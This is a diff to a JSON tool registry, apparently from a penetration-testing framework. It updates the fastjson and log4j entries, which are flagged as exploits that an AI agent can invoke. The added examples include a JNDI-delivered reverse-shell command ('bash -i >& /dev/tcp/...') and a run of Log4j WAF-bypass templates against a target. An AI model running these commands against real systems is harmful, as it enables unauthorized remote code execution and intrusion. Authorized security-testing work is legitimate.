@@ -726,40 +726,48 @@
   {
     "name": "fastjson",
     "category": "框架漏洞利用工具",
-    "type": "JAVA11",
-    "path": "/tools/fastjson/fastjson_exp.jar",
-    "description": "Fastjson 反序列化利用",
+    "type": "Python",
+    "path": "/tools/javadeser/javadeser_cli.py",
+    "description": "fastjson 反序列化利用（多种 @type gadget 链 + 绕过写法，经 JNDI 投递）",
     "risk": "exploit",
     "ai_callable": true,
     "aliases": [
       "fastjson漏洞"
     ],
-    "example": "",
-    "params_pre": "",
+    "example": "fastjson -u http://target/api --serve --lhost 10.0.0.5 --cmd 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'",
+    "params_pre": "--mode fastjson",
     "params": "",
     "weight": 0.0,
     "url": "",
-    "tags": [],
+    "tags": [
+      "Java",
+      "反序列化",
+      "fastjson"
+    ],
     "group": ""
   },
   {
     "name": "log4j",
     "category": "框架漏洞利用工具",
-    "type": "JAVA11",
-    "path": "/tools/log4j/log4j_shell.jar",
-    "description": "Log4j2 RCE 利用",
+    "type": "Python",
+    "path": "/tools/javadeser/javadeser_cli.py",
+    "description": "Log4j2 JNDI 注入利用（16 个常见注入点 + 多种 WAF 绕过模板）",
     "risk": "exploit",
     "ai_callable": true,
     "aliases": [
       "log4shell",
       "log4j2"
     ],
-    "example": "",
-    "params_pre": "",
+    "example": "log4j -u http://target/ --serve --lhost 10.0.0.5 --all-templates",
+    "params_pre": "--mode log4j",
     "params": "",
     "weight": 0.0,
     "url": "",
-    "tags": [],
+    "tags": [
+      "Java",
+      "JNDI",
+      "log4j"
+    ],
     "group": ""
   },
   {
